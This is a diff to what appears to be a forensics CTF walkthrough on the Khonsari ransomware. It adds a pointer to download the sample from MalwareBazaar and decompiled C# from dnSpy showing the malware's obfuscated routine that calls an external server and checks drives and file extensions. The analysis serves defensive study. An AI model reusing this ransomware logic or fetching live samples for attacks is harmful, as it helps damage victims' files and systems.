@@ -225,7 +225,7 @@ Click on `NTUSER.DAT` and expand SOFTWARE > Microsoft > Windows > CurrentVersion
 
 **2021-12-11 22:57:01**
 
-The hash `f2e3f685256e5f31b05fc9f9ca470f527d7fdae28fa3190c8eba179473e20789` of `baaaackdooor.exe` can be searched on Virustotal for First Submission under history.
+The sha256 hash: `f2e3f685256e5f31b05fc9f9ca470f527d7fdae28fa3190c8eba179473e20789` of `baaaackdooor.exe` can be searched on Virustotal for First Submission under history.
 
 ### 23. The ransomware downloads a text file from an external server. What is the key used to decrypt the URL?
 
@@ -234,6 +234,41 @@ The hash `f2e3f685256e5f31b05fc9f9ca470f527d7fdae28fa3190c8eba179473e20789` of `
 More research is done on this ransomeware via virustotal an detailed article on khonsari malware for apache log4j is found and was able to get the key to decrypt.
 
 <https://www.bluvector.io/threat-report/khonsari-new-malware-apache-log4j/>
+
+Another way to get the key is to reverse engineer the malware.  {: .prompt-info }
+
+Using the `f2e3f685256e5f31b05fc9f9ca470f527d7fdae28fa3190c8eba179473e20789` from question 23, we can download the malware from <https://bazaar.abuse.ch/> and open it up in [dnspy](https://github.com/dnSpy/dnSpy#:~:text=dnSpy%20is%20a%20debugger%20and,Main%20features%3A&text=NET%20and%20Unity%20assemblies), a .Net debugger.
+
+```C#
+private static void Main()
+ {
+  List<string> list = new List<string>();
+  WebClient webClient = new WebClient();
+  string text = "/\u001b\u0015\u0011R~]pi^UTF`CviVUN\u00120\u001f!(\u001c>\u0002\t=\u0016,\u0018\v\u0004>\u0018\u007f\u0006;3";
+  string text2 = text;
+  string edhcLlqR = text2;
+  string text3 = "GoaahQrC";
+  string text4 = text3;
+  string vnNtUrJn = text4;
+  webClient.DownloadString(oymxyeRJ.CajLqoCk(edhcLlqR, vnNtUrJn));
+  foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
+  {
+   string name = driveInfo.Name;
+   string text5 = "2w\u0015";
+   string text6 = text5;
+   string edhcLlqR2 = text6;
+   string text7 = "qMIamfMA";
+   string text8 = text7;
+   string vnNtUrJn2 = text8;
+   if (!name.Equals(oymxyeRJ.CajLqoCk(edhcLlqR2, vnNtUrJn2)))
+   {
+    list.Add(driveInfo.Name);
+   }
+  }
+```
+
+From dnspy, right-click on the executable and select the go-to entry point.
+we can find the main function and see that `string text3` variable is being passed around to decrypt the external url.
 
 ### 24. What is the ISP that owns that IP that serves the text file?
 
@@ -247,3 +282,37 @@ This can be found from the previous Virustotal results.
 
 The extension is **ini** as mentioned in the same report from question 23.
 <https://www.bluvector.io/threat-report/khonsari-new-malware-apache-log4j/>
+
+Another way to get the key is to reverse engineer the malware.  {: .prompt-info }
+
+In the same debugger session of dnspy from question 23 we can check the `LxqQXinF` function that is checking strings. The interesting variable here is `edhcLlqR2` which checks the condition and decrypts to ini extension.
+
+```C#
+private static bool LxqQXinF(string YzmfzBzk)
+ {
+  string text = "\u007f\u001d\0\a\u000f\"\u000e%8";
+  string text2 = text;
+  string edhcLlqR = text2;
+  string vnNtUrJn = "QvhhaQoW";
+  if (!YzmfzBzk.EndsWith(oymxyeRJ.CajLqoCk(edhcLlqR, vnNtUrJn)))
+  {
+   string text3 = "g\u001d/.";
+   string edhcLlqR2 = text3;
+   string text4 = "ItAGEocK";
+   string vnNtUrJn2 = text4;
+   if (!YzmfzBzk.EndsWith(oymxyeRJ.CajLqoCk(edhcLlqR2, vnNtUrJn2)))
+   {
+    string text5 = "\r\a2";
+    string edhcLlqR3 = text5;
+    string text6 = "diYplLvh";
+    string text7 = text6;
+    string vnNtUrJn3 = text7;
+    if (!YzmfzBzk.EndsWith(oymxyeRJ.CajLqoCk(edhcLlqR3, vnNtUrJn3)))
+    {
+     return YzmfzBzk.Equals(SCVuZRaW.HtqeFwaI);
+    }
+   }
+  }
+  return true;
+ }
+```
